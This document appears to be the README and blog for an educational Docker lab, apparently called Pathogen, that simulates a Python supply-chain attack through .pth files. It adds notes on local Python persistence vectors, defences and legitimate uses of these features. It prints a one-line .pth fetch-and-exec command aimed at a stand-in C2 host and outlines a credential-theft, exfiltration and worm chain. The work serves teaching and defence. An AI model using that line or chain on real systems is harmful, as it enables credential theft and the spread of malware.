# Pathogen

----

### The Mechanics of `.pth` File Abuse


**1. The Role of `site.py`**
When a Python interpreter starts, it automatically imports the `site` module. The primary job of `site.py` is to configure the Python path (`sys.path`), ensuring the interpreter knows where to look for third-party libraries (usually in the `site-packages` directory).

**2. The `.pth` File Feature**
To allow packages to extend the path dynamically, `site.py` looks for files with the `.pth` extension in the `site-packages` directories. 
* **Intended Use:** Typically, these files contain simple directory paths (one per line) that get appended to `sys.path`.
* **The Vulnerability (The Trigger):** `site.py` has a specific, documented behavior: if a line in a `.pth` file begins with the word `import`, the `site` module will execute that line using the built-in `exec()` function.

**3. The Attack Chain**
* **Delivery:** An attacker publishes a malicious package (e.g., via typosquatting, dependency confusion, or compromising an existing package).
* **Installation:** When a developer or CI/CD pipeline runs `pip install malicious-pkg`, the installation process (often via `setup.py` or a pre-compiled wheel) drops a crafted `.pth` file into the local environment's `site-packages` folder.
* **Execution:** The `.pth` file contains a line like `import urllib.request; exec(urllib.request.urlopen('http://malicious-c2.com/payload').read())`. 
* **Impact:** The next time *any* Python script is executed in that environment--even something as simple as `python -V` or a legitimate application starting up--the `site.py` module runs the code in the `.pth` file. This happens before the main application code even begins executing, allowing the payload to run in memory, hook functions, or steal environment variables undetected.

---

### Defensive Strategies and Mitigation

Raising awareness is crucial, but it must be paired with actionable defensive strategies. To protect against this attack surface, development teams should implement the following controls:

* **Strict Dependency Management:** Pin versions and verify package integrity using hashes. Tools like `pip-tools` (`pip-compile --generate-hashes`), Poetry, or Pipenv handle dependency locking and hash verification, preventing modified packages from being installed.
* **Private Package Registries:** Use private, authenticated package repositories (like Artifactory, Sonatype Nexus, or AWS CodeArtifact) that cache approved packages and scan them for known vulnerabilities or suspicious code patterns.
* **Environment Auditing:** Security tools and EDR agents can be configured to monitor `site-packages` directories for unexpected `.pth` files.
* **Egress Filtering:** Implement strict network controls on CI/CD build runners and production environments. Build environments should only reach approved package registries.



**A cinematic, educational Docker demo of supply-chain compromise -- inspired by the litellm `.pth` incident, redesigned around five acts: steal, exfil, wiretap, survive, spread.**

No vulnerabilities exploited. Every stage uses documented, intended language behavior.

---

## The Story

```text
0. Install      pip install pyautoconf from a poisoned local registry
   .pth Trigger  site.py executes pathogen_hook.pth -- payload fetched from C2, exec()'d in memory
1. Steal        harvest SSH keys, cloud creds, env vars, shell history
2. Exfiltrate   AES-256-CBC + RSA-4096 encrypted bundle to C2
   DNS Exfil    env vars exfiltrated via DNS TXT queries (covert channel)
3. Wiretap      monkey-patch urllib/requests to silently capture app HTTP traffic
   Persist      drop compiled bytecode implant under __pycache__
4. Spread       git worm poisons requirements.txt via stolen SSH keys
   Polyglot     same commit seeds a Node.js postinstall callback to C2
   CI/CD        build agent auto-pulls poisoned repo, gets compromised
5. Detect       blue team rules fire detection alerts in real time
```

---

## Containers

| Service | Role |
|:--|:--|
| `registry` | Local PyPI serving the malicious `pyautoconf` wheel |
| `victim` | First compromised developer workstation |
| `attacker-c2` | Serves fileless payload, receives exfil, decrypts loot, receives polyglot callback |
| `git-server` | Internal SSH git remote for worm propagation |
| `victim-2` | Second workstation -- pulls poisoned repo, runs both `pip install` and `npm install` |
| `ci-runner` | Simulated CI/CD build agent -- auto-installs from requirements.txt |
| `dns-exfil` | DNS TXT exfiltration receiver -- reassembles covert data channel |
| `dashboard` | Real-time web UI + WebSocket event hub |
| `defender` | Blue team detection engine -- YARA/Sigma rules fire alerts in real time |
| `network-capture` | tcpdump sidecar -- captures all traffic for Wireshark analysis |

---

## Quick Start

```bash
make demo
# or: docker compose up --build
```

Open [http://localhost:3000](http://localhost:3000) and click **Launch Attack**.

You'll see every stage unfold in real time:

- Fileless payload delivery via `.pth` hook
- Credential harvest + encrypted exfiltration
- C2 decrypting stolen files with RSA/AES
- DNS TXT covert exfiltration channel
- Runtime HTTP interception (wiretap events)
- `__pycache__` bytecode implant (with persistence verification)
- Git worm pushing poisoned commit
- Victim-2 auto-pulling, running `npm install`, triggering Node.js `postinstall` callback
- CI/CD build agent compromised via same poisoned repo
- Blue team detection alerts firing alongside each attack stage
- MITRE ATT&CK technique mapping in collapsible sidebar
- Full debrief overlay with PCAP download

```bash
make clean
# or: docker compose down -v
```

---

## Project Structure

```text
.
├── docker-compose.yml               10-service orchestration
├── Makefile                         demo/clean/logs/replay targets
├── demo.py                          standalone litellm-specific simulation
│
├── malicious-package/
│   ├── setup.py                     builds the pyautoconf wheel
│   ├── pathogen_hook.pth            one-line .pth trigger (fetch + exec)
│   └── pyautoconf/                  empty facade package
│
├── attacker-c2/
│   ├── server.py                    FastAPI: /stage, /exfil, /lab/internal, /polyglot
│   ├── payload_source.py            fileless 5-act payload (steal → exfil → dns → wiretap → spread)
│   ├── private_key.pem              RSA-4096 key for exfil decryption
│   └── requirements.txt
│
├── victim/
│   ├── Dockerfile
│   ├── server.py                    orchestrates install, trigger, cleanup
│   └── fake-home/                   seeded creds: SSH, AWS, GCP, .env, history, etc.
│
├── victim-2/
│   ├── Dockerfile                   includes Node.js for polyglot escape
│   ├── server.py                    git watcher + npm install + python trigger + pycache verify
│   └── fake-home/                   seeded creds for second developer
│
├── ci-runner/
│   ├── Dockerfile
│   ├── server.py                    CI/CD build agent: polls git, runs pipeline, gets owned
│   └── fake-home/                   CI-specific creds (GITHUB_TOKEN, deploy keys, etc.)
│
├── dns-exfil/
│   ├── Dockerfile
│   ├── server.py                    UDP DNS server: reassembles base64 TXT queries
│   └── requirements.txt
│
├── git-server/
│   ├── Dockerfile
│   ├── init-repo.sh                 seeds internal-app repo (requirements.txt + package.json)
│   ├── sshd_config
│   └── authorized_keys
│
├── dashboard/
│   ├── Dockerfile                   multi-stage: Tailwind build + font bundling
│   ├── app.py                       WebSocket hub + event ingest + replay + pcap download
│   ├── requirements.txt
│   ├── tailwind.config.js
│   └── static/
│       ├── index.html               real-time attack visualization + ATT&CK sidebar + detections
│       ├── css/input.css
│       └── fonts/                    self-hosted (air-gap safe)
│
├── defender/
│   ├── Dockerfile
│   ├── server.py                    WebSocket subscriber + detection engine
│   ├── requirements.txt
│   └── rules/
│       ├── pth_scan.yar             YARA rule for malicious .pth files
│       ├── sigma_rules.json         12 Sigma-style detection rules
│       └── detections.py            rule evaluation engine
│
├── scripts/
│   ├── generate-keys.sh             RSA keypair generator (demo only)
│   └── generate-ssh-keys.sh         SSH keypair generator (demo only)
│
├── blog.md                          technical write-up + threat analysis
└── LICENSE
```

---

## How the .pth Exploit Works

Python's `site.py` processes `.pth` files at interpreter startup. Lines starting with `import` are `exec()`'d unconditionally.

Pathogen's hook is a single line:

```python
import os;exec("...")
```

That one line fetches the full payload from C2 over HTTP and executes it in memory. No files written to disk. No `import pyautoconf` required -- any Python invocation triggers it.

---

## New in v2: Attack Surface Expansion

### DNS Exfiltration
After the HTTP exfil, the payload encodes env vars as base64 chunks and sends them as DNS TXT queries to `*.exfil.pathogen.local`. The `dns-exfil` container reassembles and reports to the dashboard. This demonstrates covert channel exfiltration that bypasses HTTP-layer monitoring.

### CI/CD Pipeline Compromise
The `ci-runner` container simulates a build agent (GitHub Actions / Jenkins). When the git worm pushes a poisoned `requirements.txt`, the CI runner auto-pulls and runs `pip install`, triggering the `.pth` payload in the build environment. CI-specific secrets (deploy keys, registry passwords, `GITHUB_TOKEN`) are harvested.

### `__pycache__` Persistence Verification
The bytecode implant dropped by the payload is now actually executed by victim-2 after the main payload completes, proving the `.pyc` file survives and phones home even after the original package is removed.

### Blue Team Detection Layer
The `defender` container subscribes to the dashboard WebSocket and evaluates every event against 12 Sigma-style detection rules. Detection alerts fire with a configurable delay (simulating realistic SOC latency) and appear in a dedicated "Detections" pane.

### MITRE ATT&CK Mapping
A collapsible sidebar maps each attack stage to specific ATT&CK techniques. Technique cards light up as the corresponding events fire, making the demo instantly legible to threat intelligence audiences.

### Timeline Replay
After the attack completes, click "Replay" to re-watch the entire sequence at configurable speed (1x-10x). Events replay through the same WebSocket path.

### Network Forensics
A `tcpdump` sidecar captures all bridge network traffic. After the demo, click "Download PCAP" in the debrief overlay to analyze exfil patterns in Wireshark.

---

## Safety

- Everything runs inside an isolated Docker network.
- All credentials are fake, pre-seeded in container home directories.
- No real exfiltration occurs -- the C2 is a container on the same bridge network.
- This is an educational demonstration. Do not use these techniques outside controlled environments.

---

## Credit

Inspired by the March 2025 litellm PyPI compromise and [FutureSearch's analysis](https://futuresearch.ai/blog/litellm-pypi-supply-chain-attack/).

------

# Talk Local to Me

Shifting the threat model from **Initial Access** (a supply chain attack) to **Local Persistence** or **Privilege Escalation**. In these scenarios, the attacker already has some level of access to the file system and is looking for a way to execute code automatically when a legitimate user or system process runs Python.

Here is a breakdown of how `.pth` files work locally, along with similar local attack surfaces in the Python ecosystem.

### The Local Nature of `.pth` Files

The `.pth` file mechanism is an inherent, local feature of the Python runtime. A poisoned package via `pip` is merely a *delivery vehicle* designed to cross the network boundary. 

If an attacker already has local file system access (even unprivileged user access), they do not need to infect a package at all. They can simply create a `.pth` file directly in the user's local site-packages directory (e.g., `~/.local/lib/python3.x/site-packages/`). The next time that specific user runs Python, the payload will execute.

### Similar Local Execution Vectors in Python

Beyond `.pth` files, Python's flexibility and initialization sequence offer several other local avenues for automatic code execution.



**1. `sitecustomize.py` and `usercustomize.py`**
* **The Mechanism:** During startup, Python's `site.py` module explicitly looks for two specific files: `sitecustomize.py` (global) and `usercustomize.py` (user-specific). If these files exist anywhere in the module search path, Python automatically imports and executes them before running the main script.
* **The Attack Surface:** An attacker with local access can create a malicious `usercustomize.py` file in a directory they control and add that directory to the Python path. This guarantees their code runs every time the user starts Python.

**2. Local Module Shadowing (Hijacking)**
* **The Mechanism:** When a Python script imports a module (e.g., `import math` or `import os`), Python searches for that module in a specific order. The very first place it looks is the Current Working Directory (CWD) of the script being executed.
* **The Attack Surface:** If an attacker drops a malicious file named `os.py` or `stat.py` into a directory where a legitimate, frequently used Python script resides, the legitimate script will accidentally import the attacker's malicious file instead of the standard library module. 

**3. Environment Variable Manipulation**
* **The Mechanism:** Python relies on several environment variables that dictate its behavior. 
* **The Attack Surface:**
    * **`PYTHONSTARTUP`:** If an attacker can modify a user's `.bashrc` or `.zshrc` to set `PYTHONSTARTUP=/path/to/malicious_script.py`, that script will execute silently every time the user opens an interactive Python shell.
    * **`PYTHONPATH`:** By prepending a malicious directory to the `PYTHONPATH` environment variable, an attacker forces Python to look in their directory first for *all* imports, making widespread module shadowing trivial.

---

### The Defensive Perspective

The critical difference between these local methods and a supply chain attack is the prerequisite of access. For an attacker to leverage local `.pth` creation, `usercustomize.py`, or module shadowing, they must have already compromised the host to write files to disk or modify environment variables. 

Defense against these local vectors relies heavily on traditional endpoint security rather than dependency management:
* Enforcing the Principle of Least Privilege (preventing standard users from writing to global library directories).
* File Integrity Monitoring (FIM) to alert on unexpected changes to Python installation directories.
* Monitoring for unauthorized modifications to shell profile scripts (like `.bashrc`).


-----

It's important to remember that these features were not designed as backdoors; they were built by Python's core developers to provide flexibility for system administrators, developers, and tooling ecosystems. 

Python is designed to be highly customizable, and these mechanisms solve very real configuration and development problems. Here are the valid, intended use cases for these features:

### 1. `.pth` Files and Executable `.pth` Lines
* **Editable Installs (Development):** The most common legitimate use of a standard `.pth` file is for "editable installs" during development. When you run `pip install -e .` (or `pip install --editable .`), `pip` does not copy your source code into `site-packages`. Instead, it creates a `.pth` file pointing to your project's directory. This allows you to edit your code and test it immediately without needing to reinstall the package after every change.
* **Code Coverage and APM Tools:** The "executable" `.pth` feature (lines starting with `import`) is heavily used by debugging, profiling, and Application Performance Monitoring (APM) tools. For example, the popular `coverage.py` library uses an executable `.pth` file to start measuring code execution *before* any other modules are imported. If it didn't use this trick, it would miss the execution of initialization code in other modules.

### 2. `sitecustomize.py` and `usercustomize.py`
* **Enterprise-Wide Configuration:** System administrators use `sitecustomize.py` to enforce global settings across an entire organization's servers. For example, they might use it to automatically configure corporate proxies for any script making web requests, or to enforce specific logging formats for all Python applications running on a machine.
* **Telemetry and Security Tooling:** Infrastructure teams often use these files to automatically inject monitoring agents (like Datadog, New Relic, or OpenTelemetry) into all Python processes running on a server, ensuring developers don't have to manually add these agents to their application code.
* **User-Specific Defaults:** A developer might use `usercustomize.py` on their local machine to set up personal preferences, such as custom import hooks or modifying warning filters to ignore specific deprecation notices while working locally.

### 3. Environment Variables (`PYTHONSTARTUP` and `PYTHONPATH`)
* **`PYTHONSTARTUP` for REPL Customization:** This is specifically designed for developers who spend a lot of time in the interactive Python shell (REPL). You can point `PYTHONSTARTUP` to a script that automatically imports frequently used modules (like `os`, `sys`, `json`, or `math`), sets up custom prompt colors, or configures pretty-printing so you don't have to type the same setup commands every time you open the shell.
* **`PYTHONPATH` for Local Testing:** When developers are working on multiple interdependent projects locally, they can use `PYTHONPATH` to point Python to local, unreleased versions of libraries. This allows them to test how Project A interacts with a new feature in Project B without having to publish Project B to a package registry first.

### 4. Current Working Directory (CWD) Precedence
* **Simplicity for Beginners and Scripts:** Python prioritizes the current directory for imports so that simple scripts "just work." If you write a small script and break it into two files (`main.py` and `helper.py`) in the same folder, `main.py` can simply `import helper` without you needing to set up a complex virtual environment, build a package, or configure path variables.

The core takeaway is that **flexibility is a double-edged sword**. The exact same mechanisms that allow a monitoring tool to instrument an application automatically allow an attacker to inject a payload automatically. 
